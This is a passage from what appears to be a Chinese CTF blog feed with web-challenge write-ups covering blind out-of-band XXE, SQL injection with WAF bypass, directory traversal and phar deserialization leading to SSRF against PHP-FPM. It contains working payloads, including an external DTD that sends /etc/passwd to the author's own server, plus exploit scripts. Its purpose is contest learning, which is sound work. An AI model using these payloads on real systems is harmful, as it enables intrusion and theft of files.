class="number">8</span>);</span><br><span class="line">    $image=<span class="string">"Z6Ilu83MIDw="</span>;</span><br><span class="line">    $str = openssl_decrypt($image, <span class="string">'bf-ecb'</span>, $key);</span><br><span class="line">    <span class="keyword">if</span>(strpos($str,<span class="string">"gif"</span>) <span class="keyword">or</span> strpos($str,<span class="string">"jpg"</span>) <span class="keyword">or</span> strpos($str,<span class="string">"png"</span>))&#123;</span><br><span class="line">        <span class="keyword">print</span>($str.<span class="string">" "</span>);</span><br><span class="line">        <span class="keyword">print</span>($i);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">327671.</span>jpg <span class="number">27347</span></span><br></pre></td></tr></table></figure><p>æ–‡ä»¶æ ¼å¼ä¸å¤–ä¹gif\png\jpg</p><p>åªè¦è§£å¯†åèƒ½å¤ŸåŒ¹é…åˆ°å°±ç®—æˆåŠŸäº†</p><p>å¾—åˆ°$içš„å€¼ä¸º27347</p><p>ä¸‹é¢å°±æ˜¯è§£å¯†äº†ï¼Œç”±äºæµè§ˆå™¨ä¼šè¿›è¡Œä¸€æ¬¡urlè§£ç ï¼Œè¿™é‡Œè¦è¿›è¡Œä¸€ä¸‹ç¼–ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$rand=<span class="number">27347</span>;</span><br><span class="line">$key = substr(md5(<span class="string">'ctfshow'</span>.$rand),<span class="number">3</span>,<span class="number">8</span>);</span><br><span class="line">$image=<span class="string">"config.php"</span>;</span><br><span class="line">$str = openssl_encrypt($image, <span class="string">'bf-ecb'</span>, $key);</span><br><span class="line"><span class="keyword">echo</span> $str;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode($str);</span><br><span class="line"><span class="number">27347</span>N6bf8Bd8jm0SpmTZGl0isw==&lt;br /&gt;N6bf8Bd8jm0SpmTZGl0isw%<span class="number">3</span>D%<span class="number">3</span>D</span><br></pre></td></tr></table></figure><p>è®¿é—®</p><img src="/2020/07/31/36D-web-ak-challenge/6.png" class=""><p>ä¸€å¼ æ‰“ä¸å¼€çš„å›¾ç‰‡ï¼Œä¸‹è½½ä¸‹æ¥ä¿å­˜ï¼Œnotepad++æ‰“å¼€å³å¯</p><img src="/2020/07/31/36D-web-ak-challenge/7.png" class=""><h2 id="web4-è§‚å¿ƒ"><a href="#web4-è§‚å¿ƒ" class="headerlink" title="web4_è§‚å¿ƒ"></a>web4_è§‚å¿ƒ</h2><h3 id="çŸ¥è¯†ç‚¹-4"><a href="#çŸ¥è¯†ç‚¹-4" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul><li>xxeçš„DTDå®ä½“</li></ul><h3 id="è§£é¢˜æ­¥éª¤-4"><a href="#è§£é¢˜æ­¥éª¤-4" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h3><img src="/2020/07/31/36D-web-ak-challenge/8.png" class=""><p>å åœæ—¶å¯ä»¥çœ‹åˆ°å‘api.phpï¼ŒPOSTä¼ å‚apiå’Œcity</p><p>å¯ä»¥çœ‹åˆ°æ–‡ä»¶æ ¼å¼æ˜¯xml</p><p>åº”è¯¥æ˜¯Blind_OOB_XXE ï¼Œè¿™é‡Œæœ‰ç¯‡æ–‡ç« <a href="https://blog.csdn.net/weixin_39194641/article/details/102251374" target="_blank" rel="noopener">https://blog.csdn.net/weixin_39194641/article/details/102251374</a></p><p>åœ¨è‡ªå·±çš„vpsä¸Šèµ·ä¸€ä¸ªxmlå’Œdtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://ip/test.dtd"</span>&gt;</span> </span></span><br><span class="line"><span class="meta">%remote;%int;%send; ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">reset</span>&gt;</span><span class="tag">&lt;<span class="name">login</span>&gt;</span>bee<span class="tag">&lt;/<span class="name">login</span>&gt;</span><span class="tag">&lt;<span class="name">secret</span>&gt;</span>Any bugs?<span class="tag">&lt;/<span class="name">secret</span>&gt;</span><span class="tag">&lt;/<span class="name">reset</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % p1 SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % p2 &quot;&lt;!ENTITY xxe SYSTEM &#39;ip&#x2F;pass&#x3D;%p1;&#39;&gt;&quot;&gt;</span><br><span class="line">%p2;</span><br></pre></td></tr></table></figure><p>postä¼ å‚è®¿é—®è‡ªå·±çš„vpsç½‘é¡µå°±è¡Œ</p><img src="/2020/07/31/36D-web-ak-challenge/9.png" class="">]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æ˜¨å¤©å°±çœ‹äº†ç­¾åˆ°é¢˜æ¯”è¾ƒåŒ†å¿™ï¼Œæ²¡çŒœç€æ–‡ä»¶åå°±æ²¡åšäº†ï¼Œä»Šå¤©å¥½å¥½å¤ç°
    
    </summary>
    
    
    
      <category term="show" scheme="http://yoursite.com/tags/show/"/>
    
  </entry>
  
  <entry>
    <title>DSAJuly</title>
    <link href="http://yoursite.com/2020/07/31/DSAJuly/"/>
    <id>http://yoursite.com/2020/07/31/DSAJuly/</id>
    <published>2020-07-31T02:16:05.000Z</published>
    <updated>2020-07-31T02:42:50.000Z</updated>
    
    <content type="html"><![CDATA[<p>å®‰æ’æœˆèµ›ï¼Œå°±åšå‡ºäº†ä¸€ä¸ªWEBï¼Œèµ›åå¤ç°ï¼Œå­¦ä¹ SQLæ— åˆ—åæ³¨å…¥ï¼Œä»¥åŠç­‰ä»·æ›¿æ¢çš„æ•°æ®åº“<a id="more"></a></p><h2 id="SQLI"><a href="#SQLI" class="headerlink" title="SQLI"></a>SQLI</h2><h3 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul><li>bypassinfomation_schema(sys.schema_table_statistics_with_buffer/sys.x$schema_table_statistics_with_buffer/mysql.innodb_table_stats)</li><li>sys.schema_tables_with_full_table_scans</li><li>æ— åˆ—åæ³¨å…¥</li></ul><h3 id="è§£é¢˜æ­¥éª¤"><a href="#è§£é¢˜æ­¥éª¤" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h3><p>æ‰“å¼€é¢˜ç›®è¦ä¼ å…¥id</p><p>å°è¯•è”åˆæŸ¥è¯¢ï¼Œè¿”å›äº†WAF</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> preg_match(<span class="string">"/;|benchmark|\^|if|[\s]|in|case|when|sleep|auto|desc|stat|\||lock|or|and|&amp;|like|-|`/i"</span>, $id);</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°è¢«è¿‡æ»¤çš„å…³é”®è¯ï¼Œinformation_schemaä¸èƒ½ç”¨äº†ï¼Œç„¶åå½“æ—¶æƒ³åˆ°äº†èƒ½æ›¿æ¢çš„åº“ï¼Œä½†æ˜¯ä¸çŸ¥é“æ€ä¹ˆæ‰¾</p><p>è¿™é‡Œstatè¢«è¿‡æ»¤è¯´æ˜ä¸‹é¢çš„åº“ä¹Ÿéƒ½ä¸èƒ½ç”¨äº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(sys.schema_table_statistics_with_buffer&#x2F;sys.x$schema_table_statistics_with_buffer&#x2F;mysql.innodb_table_stats)</span><br></pre></td></tr></table></figure><p>èµ›åçœ‹wpè¿˜æœ‰ä¸€ä¸ªåº“sys.schema_tables_with_full_table_scans</p><p>æŸ¥ä¸€ä¸‹è¡¨å</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=0'<span class="comment">/**/</span>union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="keyword">group_concat</span>(object_name),<span class="number">3</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>sys.schema_tables_with_full_table_scans%<span class="number">23</span></span><br><span class="line"><span class="comment">#users,flllaaaggg,sys_config</span></span><br></pre></td></tr></table></figure><img src="/2020/07/31/DSAJuly/1.png" class=""><p>ä¸‹é¢å°±æ˜¯è¦è¿›è¡Œæ— åˆ—åæ³¨å…¥</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0'<span class="comment">/**/</span>union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,(<span class="keyword">select</span><span class="comment">/**/</span>a<span class="number">.2</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>*<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>flllaaaggg)a<span class="comment">/**/</span><span class="keyword">limit</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">1</span>),<span class="number">3</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure><img src="/2020/07/31/DSAJuly/2.png" class=""><h2 id="Ezfileincude"><a href="#Ezfileincude" class="headerlink" title="Ezfileincude"></a>Ezfileincude</h2><h3 id="çŸ¥è¯†ç‚¹-1"><a href="#çŸ¥è¯†ç‚¹-1" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h3><ul><li>Unixæ—¶é—´æˆ³</li><li>æ–‡ä»¶åŒ…å«</li><li>ç›®å½•ç©¿è¶Š</li></ul><h3 id="è§£é¢˜æ­¥éª¤-1"><a href="#è§£é¢˜æ­¥éª¤-1" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h3><p>å¼€é¢˜å¾—åˆ°ä¸€å¼ å›¾ç‰‡</p><img src="/2020/07/31/DSAJuly/3.png" class=""><p>æŸ¥çœ‹æºä»£ç ï¼Œå‘ç°å¯ä»¥ç‚¹å‡»çš„åœ°å€</p><img src="/2020/07/31/DSAJuly/4.png" class=""><p>å¯ä»¥å‘ç°æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯æ—¶é—´æˆ³ä¸€ä¸ªæ˜¯base64åŠ å¯†åçš„æ–‡ä»¶åï¼Œè§£ç ä¸€ä¸‹æ˜¯gpa.png</p><p>åˆ·æ–°ä¸€ä¸‹ä¼šå‘ç°æç¤ºï¼šwhatâ€™s your time?</p><p>è¯´æ˜æ—¶é—´è¦ä¿æŒæœ€æ–°ï¼Œç›´æ¥ç›®å½•ç©¿è¶Š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</span><br></pre></td></tr></table></figure><p>ç„¶åbase64åŠ å¯†ä¸€ä¸‹ä¼ ç»™fï¼Œtè¦æ›´æ–°åˆ°æœ€æ–°</p><img src="/2020/07/31/DSAJuly/5.png" class=""><p>å½“ç„¶ä¹Ÿå¯ä»¥ç”¨åŠè‡ªåŠ¨åŒ–è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">t = int(time.time())</span><br><span class="line">f = <span class="string">'gqy.jpg?../../../../../../flag'</span></span><br><span class="line">f = base64.b64encode(f.encode()).decode()</span><br><span class="line">print(t, f)</span><br><span class="line">host = <span class="string">'http://183.129.189.60:10009/image.php?t=&#123;&#125;&amp;f=&#123;&#125;'</span>.format(t, f)</span><br><span class="line">head = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0)'</span>,</span><br><span class="line">    <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.get(url=host, headers=head)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p>é¡ºåˆ©æ‹¿åˆ°flag</p><img src="/2020/07/31/DSAJuly/6.png" class="">]]></content>
    
    <summary type="html">
    
      &lt;p&gt;å®‰æ’æœˆèµ›ï¼Œå°±åšå‡ºäº†ä¸€ä¸ªWEBï¼Œèµ›åå¤ç°ï¼Œå­¦ä¹ SQLæ— åˆ—åæ³¨å…¥ï¼Œä»¥åŠç­‰ä»·æ›¿æ¢çš„æ•°æ®åº“
    
    </summary>
    
    
    
      <category term="DAS" scheme="http://yoursite.com/tags/DAS/"/>
    
  </entry>
  
  <entry>
    <title>NCTF2019-phar-matches-everything</title>
    <link href="http://yoursite.com/2020/07/30/NCTF2019-phar-matches-everything/"/>
    <id>http://yoursite.com/2020/07/30/NCTF2019-phar-matches-everything/</id>
    <published>2020-07-30T08:41:50.000Z</published>
    <updated>2020-07-30T10:15:14.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹<a id="more"></a></h2><ul><li>vimçš„swpæ¢å¤æ–‡ä»¶</li><li>pharååºåˆ—åŒ–</li><li>protectedå±æ€§ä¸publicå±æ€§åºåˆ—åŒ–åŒºåˆ«</li><li>ç”Ÿæˆæ”»å‡»PHP-FPMçš„TCPæ•°æ®æµçš„è„šæœ¬</li><li>gopheræ‰“PHP-FPM</li></ul><h2 id="è§£é¢˜æ­¥éª¤"><a href="#è§£é¢˜æ­¥éª¤" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h2><p>æ‰“å¼€é¢˜ç›®ï¼Œèƒ½å¤Ÿä¸Šä¼ æ–‡ä»¶ï¼Œé¢˜ç›®å°±æ˜¯pharï¼Œé‚£è‚¯å®šä¸pharååºåˆ—åŒ–æœ‰å…³</p><p>æ‰«æç›®å½•ï¼Œæ²¡æœ‰å‘ç°ä»€ä¹ˆéšè—æ–‡ä»¶ï¼Œçœ‹äº†wpè¯´æ˜¯ç”¨.swpæ¢å¤ï¼Œä½†æ˜¯è¯•çš„æ—¶å€™æ²¡æ¢å¤å‡ºæ¥ï¼Œç›´æ¥GitHubæ‹¿ä¸‹äº†æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easytest</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $test;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">funny_get</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $url;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;</span><br><span class="line">        $ch = curl_init();  </span><br><span class="line">        curl_setopt($ch,CURLOPT_URL,$url);</span><br><span class="line">        curl_setopt($ch,CURLOPT_RETURNTRANSFER,<span class="keyword">true</span>);</span><br><span class="line">        $output=curl_exec($ch);</span><br><span class="line">        curl_close($ch);</span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $this_is_a_easy_test=unserialize($_GET[<span class="string">'careful'</span>]);</span><br><span class="line">        <span class="keyword">if</span>($this_is_a_easy_test-&gt;funny_get() === <span class="string">'1'</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;curl(<span class="keyword">$this</span>-&gt;url);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">"submit"</span>])) &#123;</span><br><span class="line">    $check = getimagesize($_POST[<span class="string">'name'</span>]);</span><br><span class="line">    <span class="keyword">if</span>($check !== <span class="keyword">false</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"File is an image - "</span> . $check[<span class="string">"mime"</span>] . <span class="string">"."</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"File is not an image."</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¦ç»•è¿‡getimagesizeçš„éªŒè¯ï¼ŒåŠ ä¸ŠGIF89aï¼Œè¿™é‡Œè¿˜è¦è®©Easytestç±»ä¸­çš„$test===â€˜1â€™ï¼Œç„¶åå°±å¯ä»¥åˆ©ç”¨curlæ¥è¯»å–æ–‡ä»¶å†…å®¹</p><p>ä¸‹é¢å°±æ˜¯å†™ä¸€ä¸ªpharååºåˆ—åŒ–çš„expæ¥éªŒè¯ä¸€ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easytest</span> </span>&#123;</span><br><span class="line"><span class="keyword">protected</span> $test = <span class="string">'1'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> $url =<span class="string">'file:///etc/passwd'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> Easytest();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line">$b = <span class="keyword">new</span> Main();</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">'GIF89a'</span> . <span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">$phar-&gt;setMetadata($b);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç›´æ¥å¯¹åºåˆ—åŒ–çš„æ•°æ®è¿›è¡Œurlç¼–ç ï¼Œç»è¿‡æµ‹è¯•éœ€è¦ç¼–ç </p><p>å°†æœ¬åœ°ç”Ÿæˆçš„pharæ–‡ä»¶åç¼€ä¿®æ”¹æˆgifï¼Œä¸Šä¼ ï¼Œç„¶åè®¿é—®</p><img src="/2020/07/30/NCTF2019-phar-matches-everything/1.png" class=""><p>ä¸çŸ¥é“æ˜¯æ€ä¹ˆçœ‹å‡ºæ‰“å†…ç½‘çš„ï¼Œå…ˆè·Ÿç€ç»§ç»­</p><p>æ”¹å˜urlè¯»å–/etc/hosts</p><img src="/2020/07/30/NCTF2019-phar-matches-everything/2.png" class=""><p>æˆåŠŸè¯»å–åˆ°äº†ä¸€å°ä¸»æœºåœ°å€173.111.147.10</p><img src="/2020/07/30/NCTF2019-phar-matches-everything/3.png" class=""><p>ç”¨httpåè®®è®¿é—®ä¸€ä¸‹è¯¥ç½‘å€ï¼Œå‘ç°å°±æ˜¯è¿™ä¸ªé¡µé¢</p><img src="/2020/07/30/NCTF2019-phar-matches-everything/4.png" class=""><p>æ ¹æ®ä¹‹å‰buuåšé¢˜ç»éªŒï¼Œåº”è¯¥æ˜¯ä¸‹ä¸€å°173.111.147.11ï¼Œè®¿é—®ä¸€ä¸‹</p><img src="/2020/07/30/NCTF2019-phar-matches-everything/5.png" class=""><p>æœç„¶æ˜¯è¿™æ ·ï¼Œè¿˜æœ‰æç¤ºæ˜¯è·ŸPHP-FPMç›¸å…³ï¼Œä¸‹é¢å°±æ˜¯ssrf+gopheræ‰“fpmï¼Œå…ˆæ¥çœ‹ä¸€ä¸‹phpinfo();,ä¸‹é¢æ˜¯ç”ŸæˆTCPæ•°æ®æµçš„è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="comment"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span></span><br><span class="line"></span><br><span class="line">PY2 = <span class="literal">True</span> <span class="keyword">if</span> sys.version_info.major == <span class="number">2</span> <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bchr</span><span class="params">(i)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PY2:</span><br><span class="line"> 